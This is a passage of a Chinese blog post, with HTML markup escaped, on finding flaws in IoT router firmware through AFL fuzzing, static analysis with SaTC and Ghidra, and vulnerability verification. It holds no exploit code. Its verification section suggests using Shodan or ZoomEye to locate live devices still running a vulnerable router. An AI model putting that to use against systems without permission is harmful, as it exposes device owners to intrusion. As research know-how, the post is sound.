dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#afl\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cdiv id=\"有源码\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch4 class=\"relative group\"\u003e有源码 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%e6%9c%89%e6%ba%90%e7%a0%81\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h4\u003e\n\u003cp\u003e使用 afl-gcc 进行插桩编译：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eafl-gcc test.c -o test_file\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc test.c -o test_gcc\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eafl-gcc 插桩编译后，fuzz 的速度会快一些\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接下来就可以进行 fuzz 了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eafl-fuzz -i ./fuzz_in -o ./fuzz_out ./test_file -f\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003efuzz_in 为语料库，可以直接使用 AFL 自带的 testcases\u003c/li\u003e\n\u003cli\u003efuzz_out 就是输出的内容\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"无源码\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch4 class=\"relative group\"\u003e无源码 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%e6%97%a0%e6%ba%90%e7%a0%81\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h4\u003e\n\u003cp\u003e配置：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install libtool-bin libgtk2.0-dev -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /home/iot/test/tools/AFLplusplus/qemu_mode\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./build_qemu_support.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e ..\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo make install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eafl-fuzz -Q -m none -i in -o out ./pwn_file @@\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/home/iot/test/tools/AFLplusplus/afl-fuzz -i fuzz_in -o ./fuzz_out -Q ./pwn\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/FLNCaEdOGBynpku.png\" alt=\"image-20240202034131386\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv id=\"0x05-静态分析\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x05 静态分析 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x05-%e9%9d%99%e6%80%81%e5%88%86%e6%9e%90\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.freebuf.com/sectool/339207.html\"   target=\"_blank\"\u003e\n    浅析IOT二进制静态辅助方法 - FreeBuf网络安全行业门户\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eIDA\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e大多数是32位的，少数是64位的\u003c/li\u003e\n\u003cli\u003e推荐安装keypatch插件，在patch固件的时候会方便一些\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eGhira\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e可以安装许多有用的插件\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSaTC\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e自动化挖掘工具\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e其他二进制静态辅助工具\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBinAbsInspector\u003c/li\u003e\n\u003cli\u003eRhabdomancer\u003c/li\u003e\n\u003cli\u003eHaruspex + semgrep\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"satc\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch4 class=\"relative group\"\u003eSaTC \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#satc\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h4\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/NSSL-SJTU/SaTC\"   target=\"_blank\"\u003e\n    NSSL-SJTU/SaTC: A prototype of Shared-keywords aware Taint Checking, a novel static analysis approach that tracks the data flow of the user input between front-end and back-end to precisely detect security vulnerabilities. (github.com)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e安装\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e建议通过使用Dockerfile来构建系统环境:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入SaTC代码目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e SaTC \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 构建Docker镜像\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker build . -t satc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入Dokcer环境, 自行添加目录映射\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -it satc\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果因为网络等原因无法构建，可使用我们提供等docker image\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 从docker hun拉去image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker pull smile0304/satc:V1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入Dokcer环境, 自行添加目录映射\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -it smile0304/satc:V1.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003e使用方法\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusage: satc.py \u003cspan class=\"o\"\u003e[\u003c/span\u003e-h\u003cspan class=\"o\"\u003e]\u003c/span\u003e -d /root/path/_ac18.extracted -o /root/output\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"o\"\u003e[\u003c/span\u003e--ghidra_script \u003cspan class=\"o\"\u003e{\u003c/span\u003eref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"o\"\u003e[\u003c/span\u003e--save_ghidra_project\u003cspan class=\"o\"\u003e]\u003c/span\u003e --taint_check\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"o\"\u003e[\u003c/span\u003e-b /var/ac18/bin/httpd \u003cspan class=\"p\"\u003e|\u003c/span\u003e -l 3\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSATC tool\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoptional arguments:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -h, --help            查看帮助\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -d /root/path/_ac18.extracted, --directory /root/path/_ac18.extracted\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        指定从固件中提取出的文件系统\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -o /root/output, --output /root/output\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        指定结果输出位置\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --ghidra_script \u003cspan class=\"o\"\u003e{\u003c/span\u003eref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 指定要使用的 Ghidra 脚本。 如果使用\u003cspan class=\"sb\"\u003e`\u003c/span\u003eall\u003cspan class=\"sb\"\u003e`\u003c/span\u003e命令，\u003cspan class=\"sb\"\u003e`\u003c/span\u003eref2sink_cmdi\u003cspan class=\"sb\"\u003e`\u003c/span\u003e、\u003cspan class=\"sb\"\u003e`\u003c/span\u003eref2sink_bof\u003cspan class=\"sb\"\u003e`\u003c/span\u003e和\u003cspan class=\"sb\"\u003e`\u003c/span\u003eref2share\u003cspan class=\"sb\"\u003e`\u003c/span\u003e三个脚本将同时运行\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --ref2share_result /root/path/ref2share_result  \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 运行\u003cspan class=\"sb\"\u003e`\u003c/span\u003eshare2sink\u003cspan class=\"sb\"\u003e`\u003c/span\u003e Ghidra脚本时，需要使用该参数指定\u003cspan class=\"sb\"\u003e`\u003c/span\u003eref2share\u003cspan class=\"sb\"\u003e`\u003c/span\u003e脚本的输出结果\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --save_ghidra_project \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 是否保存程序运行时产生的ghidra工程路径\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  --taint_check         \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 指定是否启用污点分析\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -b /var/ac18/bin/httpd, --bin /var/ac18/bin/httpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 用于指定需要分析的程序，如果不指定，SaTC将使用内置算法确认需要分析的程序\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -l 3, --len \u003cspan class=\"m\"\u003e3\u003c/span\u003e         \u003cspan class=\"o\"\u003e(\u003c/span\u003e可选\u003cspan class=\"o\"\u003e)\u003c/span\u003e 根据分析结果分析可能为边界的前N个程序，默认为3\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e输出结果的目录结构为：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e-- ghidra_extract_result \u003cspan class=\"c1\"\u003e# ghidra寻找函数调用路径的分析结果, 启用`--ghidra_script`选项会输出该目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- httpd \u003cspan class=\"c1\"\u003e# 每个被分析的bin都会生成一个同名文件夹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- httpd \u003cspan class=\"c1\"\u003e# 被分析的bin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- httpd_ref2sink_bof.result \u003cspan class=\"c1\"\u003e# 定位bof类型的sink函数路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- httpd_ref2sink_cmdi.result \u003cspan class=\"c1\"\u003e# 定位cmdi类型的sink函数路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e-- keyword_extract_result  \u003cspan class=\"c1\"\u003e# 关键字提取结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- detail  \u003cspan class=\"c1\"\u003e# 前端关键字提取结果(详细分析结果)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- API_detail.result \u003cspan class=\"c1\"\u003e# 提取的API详细结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- API_remove_detail.result \u003cspan class=\"c1\"\u003e# 被过滤掉的API信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- api_split.result  \u003cspan class=\"c1\"\u003e# 模糊匹配的API结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- Clustering_result_v2.result \u003cspan class=\"c1\"\u003e# 详细分析结果(不关心其他过程关心此文件即可)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- File_detail.result  \u003cspan class=\"c1\"\u003e# 记录了从单独文件中提取的关键字\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- from_bin_add_para.result \u003cspan class=\"c1\"\u003e# 在二进制匹配过程中新增的关键字\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- from_bin_add_para.result_v2 \u003cspan class=\"c1\"\u003e# 同上,V2版本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- Not_Analysise_JS_File.result \u003cspan class=\"c1\"\u003e# 未被分析的JS文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- Prar_detail.result \u003cspan class=\"c1\"\u003e# 提取的Prar详细结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- Prar_remove_detail.result \u003cspan class=\"c1\"\u003e# 被过滤掉的Prar结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- info.txt  \u003cspan class=\"c1\"\u003e# 记录前端关键字提取时间等信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- simple  \u003cspan class=\"c1\"\u003e# 前端关键字提取结果, 比较简单\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- API_simple.result \u003cspan class=\"c1\"\u003e# 在全部二进制中出现的全部API名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"p\"\u003e|\u003c/span\u003e-- Prar_simple.result  \u003cspan class=\"c1\"\u003e# 在全部二进制中出现等的全部Prar\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e-- result-httpd-ref2sink_cmdi-ctW8.txt \u003cspan class=\"c1\"\u003e# 污点分析结果,启用`--taint-check` 和 `--ghidra_script`选项才会生成该文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在\u003ccode\u003e/home/satc/res\u003c/code\u003e下生成的txt文件可以查看结果\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/cFOLYQuvWgzjpid.png\" alt=\"image-20240225155835675\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv id=\"0x06-验证漏洞\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x06 验证漏洞 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x06-%e9%aa%8c%e8%af%81%e6%bc%8f%e6%b4%9e\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e直接购买真实设备来验证漏洞\u003c/li\u003e\n\u003cli\u003e本地仿真模拟来验证 or 复现\n\u003cul\u003e\n\u003cli\u003e可以先按照 0x03 部分先对固件进行仿真模拟\u003c/li\u003e\n\u003cli\u003e然后在本地对漏洞进行验证或复现\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e一些路由器固件的漏洞可以在一些网站上查找到还在用此路由器设备的站点\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.shodan.io/\"   target=\"_blank\"\u003e\n    shodan\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.zoomeye.org/discover\"   target=\"_blank\"\u003e\n    ZoomEye\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"0x07-其他\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x07 其他 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x07-%e5%85%b6%e4%bb%96\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e挖漏洞之前可以先在各类cve cnvd平台搜索一下\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e相关产品的漏洞可以提供参考\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e也可以避免重复挖出/提交已有的漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://cve.mitre.org/cve/search_cve_list.html\"   target=\"_blank\"\u003e\n    CVE - Search CVE List (mitre.org)\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://cve.ics-csirt.io/cve\"   target=\"_blank\"\u003e\n    Vulnerabilities (CVE) - OpenCVE (ics-csirt.io)\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e挖出一个洞之后\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e可以横向看看同一家厂商的其他产品是不是也存在类似的漏洞\u003c/li\u003e\n\u003cli\u003e可以思考这个漏洞点是否有其他更加有危害的利用方式\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e还可以思考一下如何修复这个漏洞\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e应该如何打补丁\u003c/li\u003e\n\u003cli\u003e一些有漏洞的固件在第一次修补之后仍存在漏洞，我们的修复方式是否能避免这样的情况\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e可以参考一下winmt师傅的挖洞经历\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_6\"   target=\"_blank\"\u003e\n    记一次全设备通杀未授权RCE的挖掘经历-看雪-安全社区|\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"后记\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e后记 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%e5%90%8e%e8%ae%b0\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e漏洞挖掘众多尝试的一小部分：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e尝试1\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 